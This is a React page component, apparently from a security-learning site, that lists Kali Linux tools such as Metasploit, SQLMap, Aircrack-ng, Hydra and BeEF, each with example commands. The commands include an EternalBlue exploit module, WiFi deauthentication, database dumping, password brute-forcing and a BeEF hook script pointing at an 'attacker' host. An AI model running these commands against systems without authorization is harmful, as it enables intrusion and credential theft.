'use client'

import { useEffect, useState } from 'react'
import { motion, AnimatePresence } from 'framer-motion'
import { useRouter } from 'next/navigation'
import Image from 'next/image'
import { useAuthStore } from '@/lib/auth-store'
import { Navbar } from '@/components/navbar'
import { 
  Search, 
  Filter,
  ExternalLink,
  Terminal,
  Wifi,
  Database,
  Key,
  Bug,
  Shield,
  Globe,
  Lock,
  Zap,
  FileSearch,
  Skull,
  Copy,
  Check
} from 'lucide-react'

const allTools = [
  {
    name: 'Nmap',
    category: 'Reconnaissance',
    icon: Search,
    description: 'Network exploration tool and security/port scanner. Used for network discovery and security auditing.',
    commands: [
      'nmap -sV target.com',
      'nmap -sS -O target.com',
      'nmap -A -T4 target.com',
      'nmap --script vuln target.com'
    ],
    link: 'https://nmap.org',
    color: 'cyan'
  },
  {
    name: 'Metasploit',
    category: 'Exploitation',
    icon: Skull,
    description: 'The world\'s most used penetration testing framework. Contains thousands of exploits.',
    commands: [
      'msfconsole',
      'use exploit/windows/smb/ms17_010',
      'set RHOSTS target.com',
      'exploit'
    ],
    link: 'https://metasploit.com',
    color: 'red'
  },
  {
    name: 'Wireshark',
    category: 'Network Analysis',
    icon: Wifi,
    description: 'Network protocol analyzer for capturing and interactively browsing traffic.',
    commands: [
      'wireshark',
      'tshark -i eth0',
      'tshark -r capture.pcap',
      'wireshark -k -i eth0'
    ],
    link: 'https://wireshark.org',
    color: 'blue'
  },
  {
    name: 'Burp Suite',
    category: 'Web Security',
    icon: Bug,
    description: 'Integrated platform for performing security testing of web applications.',
    commands: [
      'burpsuite',
      'java -jar burpsuite_pro.jar',
      'Configure proxy: 127.0.0.1:8080',
      'Intercept HTTP traffic'
    ],
    link: 'https://portswigger.net/burp',
    color: 'orange'
  },
  {
    name: 'SQLMap',
    category: 'Web Security',
    icon: Database,
    description: 'Automatic SQL injection and database takeover tool.',
    commands: [
      'sqlmap -u "url?id=1" --dbs',
      'sqlmap -u "url" --tables',
      'sqlmap -u "url" --dump',
      'sqlmap -r request.txt'
    ],
    link: 'https://sqlmap.org',
    color: 'purple'
  },
  {
    name: 'Aircrack-ng',
    category: 'Wireless',
    icon: Wifi,
    description: 'Complete suite for assessing WiFi network security.',
    commands: [
      'airmon-ng start wlan0',
      'airodump-ng wlan0mon',
      'aireplay-ng -0 5 -a BSSID wlan0mon',
      'aircrack-ng capture.cap -w wordlist'
    ],
    link: 'https://aircrack-ng.org',
    color: 'green'
  },
  {
    name: 'Hashcat',
    category: 'Password Cracking',
    icon: Key,
    description: 'World\'s fastest and most advanced password recovery utility.',
    commands: [
      'hashcat -m 0 hash.txt wordlist.txt',
      'hashcat -m 1000 ntlm.txt rockyou.txt',
      'hashcat -a 3 ?a?a?a?a?a',
      'hashcat --show hash.txt'
    ],
    link: 'https://hashcat.net',
    color: 'yellow'
  },
  {
    name: 'John the Ripper',
    category: 'Password Cracking',
    icon: Lock,
    description: 'Password security auditing and password recovery tool.',
    commands: [
      'john --wordlist=rockyou.txt hashes.txt',
      'john --format=raw-md5 hashes.txt',
      'john --show hashes.txt',
      'unshadow passwd shadow > unshadowed.txt'
    ],
    link: 'https://openwall.com/john',
    color: 'pink'
  },
  {
    name: 'Nikto',
    category: 'Web Security',
    icon: Globe,
    description: 'Web server scanner performing comprehensive tests against web servers.',
    commands: [
      'nikto -h target.com',
      'nikto -h target.com -ssl',
      'nikto -h target.com -o report.html',
      'nikto -h target.com -Tuning x 6'
    ],
    link: 'https://cirt.net/nikto',
    color: 'indigo'
  },
  {
    name: 'Dirb/Dirbuster',
    category: 'Web Security',
    icon: FileSearch,
    description: 'Web content scanner for finding hidden directories and files.',
    commands: [
      'dirb http://target.com',
      'dirb http://target.com /usr/share/wordlists/dirb/big.txt',
      'gobuster dir -u target.com -w wordlist.txt',
      'ffuf -w wordlist.txt -u http://target.com/FUZZ'
    ],
    link: 'https://tools.kali.org/web-applications/dirb',
    color: 'teal'
  },
  {
    name: 'Hydra',
    category: 'Password Cracking',
    icon: Zap,
    description: 'Fast and flexible online password cracking tool.',
    commands: [
      'hydra -l admin -P passwords.txt ssh://target',
      'hydra -L users.txt -P pass.txt ftp://target',
      'hydra -l admin -P pass.txt http-post-form://target',
      'hydra -l admin -P pass.txt rdp://target'
    ],
    link: 'https://github.com/vanhauser-thc/thc-hydra',
    color: 'red'
  },
  {
    name: 'BeEF',
    category: 'Exploitation',
    icon: Terminal,
    description: 'Browser Exploitation Framework - focuses on the web browser.',
    commands: [
      'beef-xss',
      'cd /usr/share/beef-xss && ./beef',
      'Hook: <script src="http://attacker/hook.js"></script>',
      'Access panel: http://localhost:3000/ui/panel'
    ],
    link: 'https://beefproject.com',
    color: 'amber'
  },
]

const categories = ['All', 'Reconnaissance', 'Exploitation', 'Web Security', 'Network Analysis', 'Wireless', 'Password Cracking']

const colorMap: Record<string, string> = {
  cyan: 'from-cyan-500 to-blue-600 border-cyan-500/50',
  red: 'from-red-500 to-orange-600 border-red-500/50',
  blue: 'from-blue-500 to-indigo-600 border-blue-500/50',
  orange: 'from-orange-500 to-red-600 border-orange-500/50',
  purple: 'from-purple-500 to-pink-600 border-purple-500/50',
  green: 'from-green-500 to-teal-600 border-green-500/50',
  yellow: 'from-yellow-500 to-orange-600 border-yellow-500/50',
  pink: 'from-pink-500 to-rose-600 border-pink-500/50',
  indigo: 'from-indigo-500 to-purple-600 border-indigo-500/50',
  teal: 'from-teal-500 to-cyan-600 border-teal-500/50',
  amber: 'from-amber-500 to-yellow-600 border-amber-500/50',
}

export default function ToolsPage() {
  const router = useRouter()
  const { isAuthenticated } = useAuthStore()
  const [searchQuery, setSearchQuery] = useState('')
  const [selectedCategory, setSelectedCategory] = useState('All')
  const [copiedCommand, setCopiedCommand] = useState<string | null>(null)

  useEffect(() => {
    if (!isAuthenticated) {
      router.push('/')
    }
  }, [isAuthenticated, router])

  const filteredTools = allTools.filter(tool => {
    const matchesSearch = tool.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
                         tool.description.toLowerCase().includes(searchQuery.toLowerCase())
    const matchesCategory = selectedCategory === 'All' || tool.category === selectedCategory
    return matchesSearch && matchesCategory
  })

  const copyCommand = (command: string) => {
    navigator.clipboard.writeText(command)
    setCopiedCommand(command)
    setTimeout(() => setCopiedCommand(null), 2000)
  }

  if (!isAuthenticated) return null

  return (
    <div className="min-h-screen relative">
      {/* Background */}
      <div className="fixed inset-0 z-0">
        <Image
          src="/images/tools-bg.jpg"
          alt="Tools Background"
          fill
          className="object-cover"
          priority
        />
        <div className="absolute inset-0 bg-black/80" />
        <div className="absolute inset-0 scanlines opacity-20" />
      </div>

      <Navbar />

      {/* Content */}
      <main className="relative z-10 pt-20 pb-16">
        {/* Header */}
        <section className="px-4 py-12">
          <div className="max-w-7xl mx-auto">
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              className="text-center mb-12"
            >
              <h1 className="text-4xl md:text-5xl font-bold mb-4">
                <span className="text-cyan-400 glitch-text">Kali Linux</span>{' '}
                <span className="text-white">Tools</span>
              </h1>
              <p className="text-gray-400 max-w-2xl mx-auto">
                Comprehensive collection of penetration testing and security tools
              </p>
            </motion.div>

            {/* Search and Filter */}
            <div className="flex flex-col md:flex-row gap-4 mb-8">
              <div className="relative flex-1">
                <Search className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-500" />
                <input
                  type="text"
                  placeholder="Search tools..."
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  className="w-full pl-12 pr-4 py-3 bg-black/50 border border-gray-700 rounded-lg focus:border-cyan-500 focus:outline-none text-white"
                />
              </div>
              
              <div className="flex gap-2 overflow-x-auto pb-2">
                {categories.map((category) => (
                  <button
                    key={category}
                    onClick={() => setSelectedCategory(category)}
                    className={`px-4 py-2 rounded-lg text-sm whitespace-nowrap transition-all ${
                      selectedCategory === category
                        ? 'bg-cyan-500 text-black'
                        : 'bg-gray-800 text-gray-400 hover:bg-gray-700'
                    }`}
                  >
                    {category}
                  </button>
                ))}
              </div>
            </div>

            {/* Tools Grid */}
            <div className="grid md:grid-cols-2 gap-6">
              <AnimatePresence mode="popLayout">
                {filteredTools.map((tool, index) => (
                  <motion.div
                    key={tool.name}
                    layout
                    initial={{ opacity: 0, scale: 0.9 }}
                    animate={{ opacity: 1, scale: 1 }}
                    exit={{ opacity: 0, scale: 0.9 }}
                    transition={{ delay: index * 0.05 }}
                    className={`glass rounded-xl p-6 border ${colorMap[tool.color].split(' ')[2]} hover:scale-[1.02] transition-transform`}
                  >
                    <div className="flex items-start gap-4 mb-4">
                      <div className={`w-14 h-14 rounded-xl bg-gradient-to-br ${colorMap[tool.color].split(' ').slice(0, 2).join(' ')} flex items-center justify-center flex-shrink-0`}>
                        <tool.icon className="w-7 h-7 text-white" />
                      </div>
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center justify-between mb-1">
                          <h3 className="text-xl font-bold text-white">{tool.name}</h3>
                          <a
                            href={tool.link}
                            target="_blank"
                            rel="noopener noreferrer"
                            className="text-gray-500 hover:text-cyan-400 transition-colors"
                          >
                            <ExternalLink className="w-4 h-4" />
                          </a>
                        </div>
                        <span className="text-xs px-2 py-1 rounded bg-gray-800 text-gray-400">
                          {tool.category}
                        </span>
                      </div>
                    </div>

                    <p className="text-gray-400 text-sm mb-4">
                      {tool.description}
                    </p>

                    <div className="space-y-2">
                      <p className="text-xs text-gray-500 uppercase tracking-wider">Example Commands:</p>
                      {tool.commands.map((cmd, i) => (
                        <div
                          key={i}
                          className="flex items-center gap-2 bg-black/50 rounded-lg p-2 group"
                        >
                          <code className="text-xs text-cyan-400 flex-1 truncate">
                            $ {cmd}
                          </code>
                          <button
                            onClick={() => copyCommand(cmd)}
                            className="opacity-0 group-hover:opacity-100 transition-opacity text-gray-500 hover:text-white"
                          >
                            {copiedCommand === cmd ? (
                              <Check className="w-4 h-4 text-green-400" />
                            ) : (
                              <Copy className="w-4 h-4" />
                            )}
                          </button>
                        </div>
                      ))}
                    </div>
                  </motion.div>
                ))}
              </AnimatePresence>
            </div>

            {filteredTools.length === 0 && (
              <motion.div
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                className="text-center py-12"
              >
                <Shield className="w-16 h-16 mx-auto text-gray-600 mb-4" />
                <p className="text-gray-500">No tools found matching your search</p>
              </motion.div>
            )}
          </div>
        </section>
      </main>
    </div>
  )
}
